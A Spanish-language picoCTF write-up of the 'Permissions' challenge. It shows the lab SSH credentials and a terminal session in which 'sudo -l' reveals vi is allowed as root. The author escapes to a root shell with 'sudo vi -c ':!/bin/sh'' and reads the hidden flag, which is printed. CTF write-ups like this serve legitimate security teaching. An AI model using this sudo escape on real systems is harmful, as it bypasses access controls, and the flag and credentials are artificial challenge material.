### Permissions

Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 58098 picoplayer@saturn.picoctf.net`Password: `j4ks-9nxB-`Can you login and read the root file?
### Solución 1 - Ruptura de un sudo


```
picoplayer@challenge:/$ ls -l
total 0
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
d---------   1 root   root     27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root    340 Feb 19 00:44 dev
drwxr-xr-x   1 root   root     66 Feb 19 00:44 etc
drwxr-xr-x   1 root   root     24 Aug  4  2023 home
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root      6 Mar  8  2023 media
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 238 nobody nogroup   0 Feb 19 00:44 proc
drwx------   1 root   root     23 Aug  4  2023 root
drwxr-xr-x   1 root   root     66 Feb 19 00:47 run
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup   0 Feb 19 00:44 sys
drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
drwxr-xr-x   1 root   root     17 Mar  8  2023 var
picoplayer@challenge:/$ cd root
-bash: cd: root: Permission denied
picoplayer@challenge:/$ sudo -i
[sudo] password for picoplayer: 
Sorry, user picoplayer is not allowed to execute '/bin/bash' as root on challenge.
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Sorry, try again.
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ sudo vi -c ':!/bin/sh' /dev/null

# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
# cd root
# ls
# ls -l
total 0
# ls -la
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 19 00:44 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
```


picoCTF{uS1ng_v1m_3dit0r_021d10ab}
### Notas
Se ingresó el comando: sudo vi -c ':!/bin/sh' /dev/null para poder acceder a un shell auxiliar en modo de usuario root, de esta manera se accede a la carpeta root que estaba restringida y se puede acceder al archivo buscando TODO lo de la carpeta sin importar que esté oculto con ls -la, así se encuentra el archivo .flag.txt.

### Referencias
https://gtfobins.org/gtfobins/vi/